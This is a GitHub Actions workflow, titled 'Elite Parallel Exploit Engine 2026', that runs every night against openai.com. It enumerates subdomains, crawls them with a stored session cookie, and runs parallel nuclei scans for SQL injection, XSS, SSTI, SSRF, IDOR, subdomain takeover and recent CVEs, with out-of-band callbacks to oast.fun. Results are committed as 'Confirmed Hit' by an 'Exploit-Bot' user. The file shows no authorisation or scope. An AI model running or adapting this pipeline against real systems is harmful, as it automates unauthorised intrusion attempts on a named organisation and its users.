name: "Elite Parallel Exploit Engine 2026"

on:
  schedule:
    - cron: '0 0 * * *'
  workflow_dispatch:

permissions:
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Tools
        run: |
          go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install -v github.com/projectdiscovery/katana/cmd/katana@latest
          go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH

      - name: Build Target Delta
        env:
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          # Use Absolute Workspace Path to avoid Exit Code 2
          BASE_DIR="${{ github.workspace }}"
          DATA_DIR="$BASE_DIR/recon_storage"
          
          # Clean and Create
          rm -rf "$DATA_DIR" || true
          mkdir -p "$DATA_DIR"
          
          # Ensure master params exists in root
          touch "$BASE_DIR/params.txt"
          
          # 1. Discovery
          subfinder -d openai.com -all -auth $PDCP_API_KEY -silent > "$DATA_DIR/subs.txt"
          uncover -q "openai.com" -auth $PDCP_API_KEY -limit 300 >> "$DATA_DIR/subs.txt" || true
          cat "$DATA_DIR/subs.txt" | sort -u | httpx -silent -t 50 -o "$DATA_DIR/alive.txt"
          
          # 2. Authenticated Crawling
          katana -list "$DATA_DIR/alive.txt" -jc -kf all -d 2 -H "Cookie: $COOKIE" -o "$DATA_DIR/params_new.txt" || touch "$DATA_DIR/params_new.txt"
          
          # 3. Delta Logic (Scan only new URLs)
          if [ -s "$DATA_DIR/params_new.txt" ]; then
             grep -vFf "$BASE_DIR/params.txt" "$DATA_DIR/params_new.txt" > "$DATA_DIR/to_scan.txt" || cp "$DATA_DIR/params_new.txt" "$DATA_DIR/to_scan.txt"
          else
             touch "$DATA_DIR/to_scan.txt"
          fi
          
          # 4. Merge results for the next run
          cat "$BASE_DIR/params.txt" "$DATA_DIR/params_new.txt" | sort -u > "$DATA_DIR/master_params_updated.txt"

      - name: Save Recon Data
        uses: actions/upload-artifact@v4
        with:
          name: targets
          path: recon_storage/

  fuzz:
    needs: recon
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        vuln_type: [sqli, xss, ssti, ssrf, idor, takeover, exposure]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          name: targets
          path: recon_storage/

      - name: Setup & Update Nuclei
        run: |
          go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          echo "$HOME/go/bin" >> $GITHUB_PATH
          $HOME/go/bin/nuclei -ut

      - name: Parallel Attack
        env:
          ISH_TOKEN: ${{ secrets.INTERACTSH_TOKEN }}
          PDCP_API_KEY: ${{ secrets.PDCP_API_KEY }}
          COOKIE: ${{ secrets.OPENAI_COOKIE }}
        run: |
          mkdir -p hits_folder
          if [ -s recon_storage/to_scan.txt ]; then
            nuclei -l recon_storage/to_scan.txt \
              -tags ${{ matrix.vuln_type }},cve2025,cve2026 \
              -auth $PDCP_API_KEY \
              -interactsh-server oast.fun \
              -header "Cookie: $COOKIE" \
              -rate-limit 100 \
              -o hits_folder/${{ matrix.vuln_type }}_hits.txt
          fi

      - name: Atomic Save
        run: |
          git config --local user.email "bot@hacker.ai"
          git config --local user.name "Exploit-Bot"
          
          for i in {1..15}; do
            git fetch origin main
            git rebase origin/main || (git rebase --abort && git reset --hard origin/main)
            
            # Sync master list
            [ -f recon_storage/master_params_updated.txt ] && cp recon_storage/master_params_updated.txt params.txt
            
            # Save hits
            mkdir -p final_results
            if [ -d hits_folder ] && [ "$(ls -A hits_folder/)" ]; then
              cp hits_folder/*.txt final_results/
            fi
            
            git add params.txt final_results/
            
            if git commit -m "Confirmed Hit: ${{ matrix.vuln_type }} $(date)"; then
              git push origin main && break
            else
              echo "Nothing to commit"
              break
            fi
            sleep $(( (RANDOM % 20) + 10 ))
          done
          
